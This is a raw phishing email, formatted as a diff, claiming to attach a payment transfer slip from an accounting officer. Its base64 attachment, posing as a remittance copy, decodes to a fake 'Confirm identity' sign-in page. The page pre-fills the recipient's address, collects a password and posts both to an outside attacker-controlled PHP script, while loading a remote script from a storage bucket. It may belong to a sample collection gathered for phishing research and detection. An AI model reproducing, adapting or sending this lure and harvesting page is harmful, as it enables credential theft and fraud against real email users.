@@ -1,0 +1,285 @@
+Return-Path: admin@qoalsearchers.com
+Delivered-To: jose@monkey.org
+X-FDA: 81685102842.33.1A2E22C
+Received: from qoalsearchers.com (qoalsearchers.com [185.236.231.217])
+	by imf11.b.hostedemail.com (Postfix) with ESMTP id 6EABC80008
+	for <jose@monkey.org>; Tue, 16 Jan 2024 12:28:39 +0000 (UTC)
+Authentication-Results: imf11.b.hostedemail.com;	dkim=pass
+ header.d=qoalsearchers.com header.s=dkim header.b=v5HRr7CY;	dmarc=pass
+ (policy=reject) header.from=qoalsearchers.com;	spf=pass
+ (imf11.b.hostedemail.com: domain of admin@qoalsearchers.com designates
+ 185.236.231.217 as permitted sender) smtp.mailfrom=admin@qoalsearchers.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1705408119;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=BrbtAxsyURfY9CumzkBv/3Aa5ceoyJ3ZEp7bmwbA4ug=;
+	b=2pAvhXlc1ROMhLI+eLC9SrTp6gEw0sDcyu9Tla5LP7/eTiT+SikZzJpAUOhW987kGNuZSJ
+	tAJRoGZ4DPR08uh2/35eF1NsYCZQIMR0RhrOfvn3cHCTlVhlD7QUBnd7/WinuUpFwgIZOF
+	a0ktbR4GVKecW2h399GbXOeSxNlI5pA=
+ARC-Authentication-Results: i=1;	imf11.b.hostedemail.com;	dkim=pass
+ header.d=qoalsearchers.com header.s=dkim header.b=v5HRr7CY;	dmarc=pass
+ (policy=reject) header.from=qoalsearchers.com;	spf=pass
+ (imf11.b.hostedemail.com: domain of admin@qoalsearchers.com designates
+ 185.236.231.217 as permitted sender) smtp.mailfrom=admin@qoalsearchers.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1705408119; a=rsa-sha256;
+	cv=none;
+	b=QCGB4ljMR0WeranscBgvP6ht9M+HDUOlOzlkw0cP7YswlR9Ut+Ma6PK/+s2McppYrTlaG3
+	nPwbJCX9I4MDYzt34plzm3fktZOPMLD2X10t5AahT7ZB4kWKAeml7U/5YSQOMsAnDlSQLj
+	KkTvIC0HvhEE0VXEoWp2eHiT3zM2U3c=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=qoalsearchers.com; s=dkim; h=Content-Type:MIME-Version:Message-ID:Date:
+	Subject:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=BrbtAxsyURfY9CumzkBv/3Aa5ceoyJ3ZEp7bmwbA4ug=; b=v5HRr7CYUvDY5vJr4RLv5nRmnV
+	eXKtRaZNWyxXc1f82c8KJD3hukItA4e/kkMhP9Onc74y/6Qjf1+7uN8zG8dAM7CTNKIgo9cXVhRwL
+	qoOA8GyRUf+z2wwIjfl2dDH8NgiY3a03PQMq2TC54IrB8WeZDVW3iJ6e9aYlXxbYy6J0=;
+Received: from [185.222.58.79] (helo=qoalsearchers.com)
+	by qoalsearchers.com with esmtpa (Exim 4.96.2)
+	(envelope-from <admin@qoalsearchers.com>)
+	id 1rNhmn-0008LN-2Z
+	for jose@monkey.org;
+	Wed, 10 Jan 2024 23:15:01 +0000
+From: Accounting <admin@qoalsearchers.com>
+To: jose@monkey.org
+Subject: Re: Payment Swift
+Date: 11 Jan 2024 00:15:00 +0100
+Message-ID: <20240111001500.5F28D12C63A33315@qoalsearchers.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_7EC0F211.959A4601"
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 6EABC80008
+X-Stat-Signature: mqdx9tmq85mp8poedoxm9r48iysghyou
+X-Rspam-User: 
+X-Spam-Status: No, score=2.67
+X-HE-Tag: 1705408119-966560
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18r0Fo0s0gL3QduPdrwGs4h1/bQ6nzBvrZ+uK+OywUt77a?=
+ =?utf-8?q?yqb9MRwH2dxl9I4IU8YDMwa6nKNhthlSXZLssvqpqDCgd5bavkqmGrPwzAznJ3OW4?=
+ =?utf-8?q?Dvwfmgd4NKNUxkDMjwXDY/HMN6BAjaW/RPINC31vNwSRpgD+R98yPAIzJz1O51JUj?=
+ =?utf-8?q?ZZX8I/PUNkFHTNZJtuJuXnbprASTKUo26Dpz3G+3H74/Rana4k=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 25
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_7EC0F211.959A4601
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body>
+<P><SPAN style=3D"FONT-SIZE: 15px; WHITE-SPACE: normal; WORD-SPACING: 0px; =
+TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); =
+FONT-STYLE: normal; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
+or: initial">
+<SPAN style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; =
+DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255)=
+; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norm=
+al; text-decoration-style: initial; text-decoration-color: initial"><FONT s=
+ize=3D4>
+<SPAN style=3D"FONT-SIZE: 14px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
+T-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FON=
+T-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-=
+SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
+-variant-ligatures: normal; font-variant-caps: normal; text-decoration-styl=
+e: initial; text-decoration-color: initial">Attached is the transfer slip.<=
+/SPAN></FONT></SPAN></SPAN></P>
+<P><SPAN style=3D"FONT-SIZE: 15px; WHITE-SPACE: normal; WORD-SPACING: 0px; =
+TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); =
+FONT-STYLE: normal; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
+or: initial">
+<SPAN style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; =
+DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255)=
+; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norm=
+al; text-decoration-style: initial; text-decoration-color: initial"><FONT s=
+ize=3D4>
+<SPAN style=3D"FONT-SIZE: 14px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
+T-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FON=
+T-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-=
+SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
+-variant-ligatures: normal; font-variant-caps: normal; text-decoration-styl=
+e: initial; text-decoration-color: initial">Please confirm receipt of payme=
+nt.<BR><BR></P>
+<P><SPAN style=3D"FONT-SIZE: 15px; WHITE-SPACE: normal; WORD-SPACING: 0px; =
+TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); =
+FONT-STYLE: normal; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
+or: initial">
+<SPAN style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; =
+DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255)=
+; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norm=
+al; text-decoration-style: initial; text-decoration-color: initial"><FONT s=
+ize=3D4>
+<SPAN style=3D"FONT-SIZE: 14px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
+T-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FON=
+T-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-=
+SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
+-variant-ligatures: normal; font-variant-caps: normal; text-decoration-styl=
+e: initial; text-decoration-color: initial">
+If you are unable to view the attached direct deposit stub, please contact =
+us immediately at 613-476-248.</SPAN></FONT></SPAN></SPAN></P>
+<P><BR></SPAN></FONT></SPAN></SPAN>&nbsp;</P>
+<P><SPAN style=3D"FONT-SIZE: 15px; WHITE-SPACE: normal; WORD-SPACING: 0px; =
+TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); =
+FONT-STYLE: normal; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
+or: initial">
+<SPAN style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; =
+DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255)=
+; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norm=
+al; text-decoration-style: initial; text-decoration-color: initial"><FONT s=
+ize=3D4>
+<SPAN style=3D"FONT-SIZE: 14px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
+T-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FON=
+T-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-=
+SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
+-variant-ligatures: normal; font-variant-caps: normal; text-decoration-styl=
+e: initial; text-decoration-color: initial">Regards,</SPAN></FONT></SPAN></=
+SPAN></P>
+<P><SPAN style=3D"FONT-SIZE: 15px; WHITE-SPACE: normal; WORD-SPACING: 0px; =
+TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); =
+FONT-STYLE: normal; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
+or: initial">
+<SPAN style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; =
+DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255)=
+; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norm=
+al; text-decoration-style: initial; text-decoration-color: initial"><FONT s=
+ize=3D4>
+<SPAN style=3D"FONT-SIZE: 14px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
+T-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FON=
+T-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-=
+SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
+-variant-ligatures: normal; font-variant-caps: normal; text-decoration-styl=
+e: initial; text-decoration-color: initial">Mrs Caroline Mendelsohn</SPAN><=
+/FONT></SPAN></SPAN></P>
+<P><SPAN style=3D"FONT-SIZE: 15px; WHITE-SPACE: normal; WORD-SPACING: 0px; =
+TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); =
+FONT-STYLE: normal; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
+or: initial">
+<SPAN style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; =
+DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255)=
+; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norm=
+al; text-decoration-style: initial; text-decoration-color: initial"><FONT s=
+ize=3D4>
+<SPAN style=3D"FONT-SIZE: 14px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
+T-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FON=
+T-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-=
+SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
+-variant-ligatures: normal; font-variant-caps: normal; text-decoration-styl=
+e: initial; text-decoration-color: initial">CFO (UAACI).</SPAN></FONT></SPA=
+N></SPAN></P></BODY></HTML>
+------=_NextPart_000_0012_7EC0F211.959A4601
+Content-Type: application/octet-stream; name="Remittance_Deposit_Copy.shtml"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Remittance_Deposit_Copy.shtml"
+
+PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPHN0eWxlPg0KLmJ1dHRvbiB7DQog
+IGJhY2tncm91bmQtY29sb3I6IGRhcmtibHVlOw0KICBib3JkZXI6IG5vbmU7DQogIGNvbG9y
+OiB3aGl0ZTsNCiAgcGFkZGluZzogMTJweCAzN3B4Ow0KICB0ZXh0LWFsaWduOiBjZW50ZXI7
+DQogIHRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgZGlzcGxheTogaW5saW5lLWJsb2NrOw0K
+ICBmb250LXNpemU6IDE2cHg7DQogIG1hcmdpbjogNHB4IDJweDsNCiAgY3Vyc29yOiBwb2lu
+dGVyOw0KfQ0KLm5ldy1kcmVhbSB7DQogIGJhY2tncm91bmQtY29sb3I6IGRhcmtibHVlOw0K
+ICBib3JkZXI6IG5vbmU7DQogIGNvbG9yOiB3aGl0ZTsNCiAgcGFkZGluZzogMTJweCAzN3B4
+Ow0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIHRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAg
+ZGlzcGxheTogaW5saW5lLWJsb2NrOw0KICBmb250LXNpemU6IDE2cHg7DQogIG1hcmdpbjog
+NHB4IDJweDsNCiAgY3Vyc29yOiBwb2ludGVyOw0KfQ0KDQoNCmJvZHksIGh0bWwgew0KICBo
+ZWlnaHQ6IDEwMCU7DQogIG1hcmdpbjogMDsNCiAgICBmb250LWZhbWlseTogJ0NhbGlicmkn
+LCBzZXJpZjsNCiAgICAgICAgZm9udC1zaXplOiAxNnB4Ow0KfQ0KDQoqIHsNCiAgYm94LXNp
+emluZzogYm9yZGVyLWJveDsNCn0NCg0KLmJnLWltYWdlIHsNCiAgDQogIC8qIEZ1bGwgaGVp
+Z2h0ICovDQogIGhlaWdodDogMTAwJTsgDQogIA0KICAvKiBDZW50ZXIgYW5kIHNjYWxlIHRo
+ZSBpbWFnZSBuaWNlbHkgKi8NCiAgYmFja2dyb3VuZC1wb3NpdGlvbjogZml4ZWQ7DQogIGJh
+Y2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogIGJhY2tncm91bmQtc2l6ZTogY292ZXI7
+DQp9DQogIEBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDEwMjRweCl7DQogICAuYmct
+aW1hZ2Ugew0KICAgIGxlZnQ6IDUwJTsNCiAgICBtYXJnaW4tbGVmdDogLTUxMnB4OyB9DQog
+IH0NCg0KLyogUG9zaXRpb24gdGV4dCBpbiB0aGUgbWlkZGxlIG9mIHRoZSBwYWdlL2ltYWdl
+ICovDQouYmctdGV4dCB7DQogIGJhY2tncm91bmQtY29sb3I6IHJnYigwLDAsMCk7IC8qIEZh
+bGxiYWNrIGNvbG9yICovDQogIGJhY2tncm91bmQtY29sb3I6IHdoaXRlOyAvKiBCbGFjayB3
+L29wYWNpdHkvc2VlLXRocm91Z2ggKi8NCiAgY29sb3I6IGJsYWNrOw0KICBib3JkZXI6IDNw
+eCBzb2xpZCAjZjFmMWYxOw0KICBwb3NpdGlvbjogYWJzb2x1dGU7DQogIHRvcDogNTAlOw0K
+ICBsZWZ0OiA1MCU7DQogIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpOw0KICB6
+LWluZGV4OiAyOw0KICB3aWR0aDogNDAwcHg7DQogIHBhZGRpbmc6IDIwcHg7DQogIHRleHQt
+YWxpZ246IGNlbnRlcjsNCiAgLW1vei1ib3gtc2hhZG93OiAwIDAgMjBweCBibGFjazsgDQog
+IC13ZWJraXQtYm94LXNoYWRvdzogMCAwIDIwcHggYmxhY2s7IA0KICAgYm94LXNoYWRvdzog
+MCAwIDIwcHggYmxhY2s7IA0KfQ0KDQppbnB1dFt0eXBlPXBhc3N3b3JkXSB7DQogIHdpZHRo
+OiA3MCU7DQogIHBhZGRpbmc6IDEycHg7DQogIGJvcmRlcjogMXB4IHNvbGlkICNjY2M7DQog
+IGJvcmRlci1yYWRpdXM6IDRweDsNCiAgcmVzaXplOiB2ZXJ0aWNhbDsNCn0NCg0KaW5wdXRb
+dHlwZT1lbWFpbF0gew0KICB3aWR0aDogNzAlOw0KICBwYWRkaW5nOiAxMnB4Ow0KICBib3Jk
+ZXI6IDFweCBzb2xpZCAjY2NjOw0KICBib3JkZXItcmFkaXVzOiA0cHg7DQogIHJlc2l6ZTog
+dmVydGljYWw7DQp9DQoNCmgzIHsNCiAgYmFja2dyb3VuZDogIzAwQTRFRjsNCiAgY29sb3I6
+IHdoaXRlOw0KICB0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlOw0KfQ0KLmNvbnRhaW5lciB7
+DQogIHBhZGRpbmc6IDMwcHg7DQp9DQoNCi5hZGQtZHJlYW0gew0KICBkaXNwbGF5OiBub25l
+Ow0KfQ0KPC9zdHlsZT4NCg0KDQoNCg0KPHRpdGxlPkNvbmZpcm0gaWRlbnRpdHk8L3RpdGxl
+Pg0KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJteS5jc3MiPg0KPHNjcmlwdCBzcmM9
+Imh0dHBzOi8vbXlzZWxmYW5kbWUuczMuYW1hem9uYXdzLmNvbS9teS5qcyI+PC9zY3JpcHQ+
+DQo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuNS4xLm1p
+bi5qcyI+PC9zY3JpcHQ+DQo8bGluayByZWw9InN0eWxlc2hlZXQiDQogICAgICAgICAgaHJl
+Zj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUNhbGlicmkiPg0K
+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5p
+dGlhbC1zY2FsZT0xIj4NCg0KDQo8L2hlYWQ+DQoNCg0KPGJvZHkgb25sb2FkPSJteUZ1bmN0
+aW9uKCkiPjwvPg0KDQoNCg0KICANCg0KPGJvZHk+DQoNCg0KPGRpdiBjbGFzcz0iYmctaW1h
+Z2UiPjwvZGl2Pg0KDQo8ZGl2IGNsYXNzPSJiZy10ZXh0Ij4NCjxpbWcgc3JjPSJodHRwczov
+L2VuY3J5cHRlZC10Ym4wLmdzdGF0aWMuY29tL2ltYWdlcz9xPXRibjpBTmQ5R2NTbFFFTnhM
+Z21GUC1yVi1LeUNoU2Rrd3IzQm9pbW1oTVhObHcmdXNxcD1DQVUiIHdpZHRoPSIyMDAiLz4N
+Cg0KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQogIA0KPHA+DQoNCiAgICA8cCBpZD0i
+cDEiPk5ldyBzaGFyZWQgZG9jdW1lbnQocykgYXZhaWxhYmxlPC9wPg0KICAgIDxkaXYgY2xh
+c3M9InBhbmVsIHBhbmVsLWRlZmF1bHQgZHJlYW0tYWRkLWNvbnRhaW5lciI+DQogICAgICA8
+ZGl2IGNsYXNzPSJwYW5lbC1oZWFkaW5nIj48L2Rpdj48cD4NCiAgICAgIDxkaXYgY2xhc3M9
+InBhbmVsLWJvZHkiPg0KDQogICAgICAgIDxidXR0b24gY2xhc3M9Im5ldy1kcmVhbSIgdHlw
+ZT0iYnV0dG9uIj5PcGVuPC9idXR0b24+DQogICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9
+ImZvcm0tZ3JvdXAiPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+ICAg
+PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Imh0dHA6Ly9hcGFjLXByb2Nlc3MtaW5zaWdu
+dHMuY29tLy9SaWNjL2xvZ2luLnBocCIgY2xhc3M9ImFkZC1kcmVhbSI+ICANCjxiPjxmb250
+IHNpemU9IjIiIGNvbG9yPSJibHVlIj5Db25maXJtIEVtYWlsIEFjY291bnQgdG8gY29udGlu
+dWU8L2ZvbnQ+PC9iPiAgDQogICAgICAgICAgICA8aW5wdXQgdHlwZT0iZW1haWwiIHBsYWNl
+aG9sZGVyPSJFbWFpbCBhZGRyZXNzIiBuYW1lPSJlbWFpbCIgcmVxdWlyZWQ9IiIgcmVhZG9u
+bHk9InJlYWRvbmx5IiByZXF1aXJlZD0iIiB2YWx1ZT0iam9zZUBtb25rZXkub3JnIjw/cGhw
+ICAvPjxwPg0KPHA+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgcmVx
+dWlyZWQ9IiIgdm1pbj0iNSIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIj4gIDxwPjwvcD48YnV0
+dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1dHRvbiI+U2lnbiBpbjwvYnV0dG9uPjxwPg0K
+ICAgICAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vYy50ZW5vci5jb20vSTZrTi02WDduaEFB
+QUFBai9sb2FkaW5nLWJ1ZmZlcmluZy5naWYiIHdpZHRoPSIzMCIvPg0KICAgICAgICAgICAg
+ICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPg0KICAgICAgICAgICANCiAgICAgICAgICA8
+L2Rpdj4NCiAgICAgICAgPC9mb3JtPg0KDQogICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCg0K
+ICA8L2Rpdj4NCg0KPC9ib2R5Pg0KDQo8L2h0bWw+DQo8IS0tIHBhcnRpYWwgLS0+DQogIDxz
+Y3JpcHQgc3JjPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9qcXVl
+cnkvMy4yLjEvanF1ZXJ5Lm1pbi5qcyc+PC9zY3JpcHQ+DQo8c2NyaXB0IHNyYz0naHR0cHM6
+Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvMy4z
+LjcvanMvYm9vdHN0cmFwLm1pbi5qcyc+PC9zY3JpcHQ+PHNjcmlwdCAgc3JjPSIuL3Njcmlw
+dC5qcyI+PC9zY3JpcHQ+DQogICAgIDwvZm9ybT4NCiAgPC9kaXY+DQoNCjwvYm9keT4NCjxz
+Y3JpcHQ+DQogICQoZnVuY3Rpb24oKSB7DQogIHZhciBvYmogPSAkKCIuZHJlYW0tYWRkLWNv
+bnRhaW5lciIpOw0KICBvYmouZmluZCgiLm5ldy1kcmVhbSIpLm9uKCJjbGljayIsIGZ1bmN0
+aW9uKCkgew0KICAgICQodGhpcykuaGlkZSgpOw0KICAgIG9iag0KICAgICAgLmZpbmQoIi5h
+ZGQtZHJlYW0iKQ0KICAgICAgLnN0b3AoKQ0KICAgICAgLnNsaWRlRG93bigpOw0KICB9KQ0K
+ICAuZW5kKCkuZmluZCgiLmJ0bi1jYW5jZWwiKS5vbignY2xpY2snLCBmdW5jdGlvbigpew0K
+b2JqDQogICAgICAuZmluZCgiLmFkZC1kcmVhbSIpDQogICAgICAuc3RvcCgpDQogICAgICAu
+c2xpZGVVcChmdW5jdGlvbigpew0KICBvYmouZmluZCgiLm5ldy1kcmVhbSIpLnN0b3AoKS5m
+YWRlSW4oKQ0KfSkNCiAgICANCn0pDQp9KTsNCjwvc2NyaXB0Pg0KDQoNCg0KDQoNCjwvaHRt
+bD4=
+
+------=_NextPart_000_0012_7EC0F211.959A4601--
+
+
